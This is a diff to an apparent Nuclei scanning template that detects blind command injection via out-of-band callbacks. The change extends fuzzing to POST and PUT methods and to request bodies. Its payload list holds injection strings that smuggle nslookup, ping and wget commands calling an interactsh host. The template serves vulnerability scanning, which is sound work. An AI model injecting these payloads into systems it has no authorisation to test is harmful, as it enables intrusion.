@@ -12,7 +12,7 @@ info:
     - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md
   metadata:
     max-request: 4
-  tags: cmdi,oast,dast,blind,polyglot
+  tags: cmdi,oast,dast,blind,polyglot,vuln
 
 variables:
   marker: "{{interactsh-url}}"
@@ -22,7 +22,8 @@ http:
       - type: dsl
         dsl:
           - 'method == "GET"'
-
+          - 'method == "POST"'
+          - 'method == "PUT"'
     payloads:
       payload:
         - "&nslookup {{marker}}&'\\\"`0&nslookup {{marker}}&`'"
@@ -31,7 +32,9 @@ http:
         - "$(ping -c 1 {{marker}} | nslookup {{marker}} ; wget {{marker}} -O /dev/null)"
 
     fuzzing:
-      - part: query
+      - parts:
+          - query
+          - body
         type: postfix
         fuzz:
           - "{{payload}}"
@@ -47,4 +50,4 @@ http:
         part: interactsh_protocol
         words:
           - "http"
-# digest: 490a0046304402202419d4ba5f4fd3416fe79458763767d93bf1ef5d7d4c6965bf8e45e7c6cbd841022019c41483c2c7a9df4ff398b7c51adf43b795237a5c14ebd46af70e61e6e4ece3:922c64590222798bb761d5b6d8e72950
+# digest: 4b0a00483046022100ffa659b189fa15afd2deb641d4d7b3ad6fc998004693b214687229e64c044014022100a35d3b3c7ca81690c0c05e027ef0b95752a80e42a98e5902bb995e10d39e35b7:922c64590222798bb761d5b6d8e72950
